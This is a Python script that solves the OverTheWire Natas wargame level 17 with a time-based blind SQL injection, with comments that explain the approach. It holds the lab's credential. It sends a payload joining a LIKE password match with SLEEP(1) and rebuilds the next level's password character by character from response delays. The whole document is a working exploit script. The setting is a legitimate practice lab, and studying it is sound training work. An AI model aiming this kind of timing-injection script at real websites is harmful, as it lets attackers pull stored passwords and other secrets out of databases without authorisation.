#!/bin/python3

import string
import requests
import re
import html.parser
import time

username = 'natas17'
oldpassword = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://%s.natas.labs.overthewire.org?debug=ture' % (username)
session = requests.Session()

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""
temppass = ""
for i in range(0,len(oldpassword)):
    print (i)
    for j in range(0,len(charset)):

        temppass = password + charset[j] + "%"
        print ("current attempt = " + temppass)
        start = time.time()
        query = 'natas18" AND BINARY password LIKE "'+ temppass +'" AND SLEEP(1)#' 
        data = { "username" : query,  "submit" : "Check existence"} 
        response = session.post(url, data =data, auth = (username,oldpassword) )

        content = html.unescape(response.text)
        #print(content)
        end = time.time()
        split = end-start
        if split > 1:
            password = password + charset[j] 
            print ("password so far = " + password)
            break
        else:
            continue

print ("password = " + password)


#this one is another blind sql injection attack but
#this time the site is not giving out any obvious output
#therefore we have to construct a query that will sleep
#when some condition is met
#this condition will be when our query has matched the start of the password
#this is identical to before although it will take longer as 
#the sleep function has to be long enough to ensure there are no positives
#but we only need it to sleep when we have actually found the next character

#the query we want to submit is 
#  natast18" AND BINARY password LIKE "temppass" AND SLEEP(5)
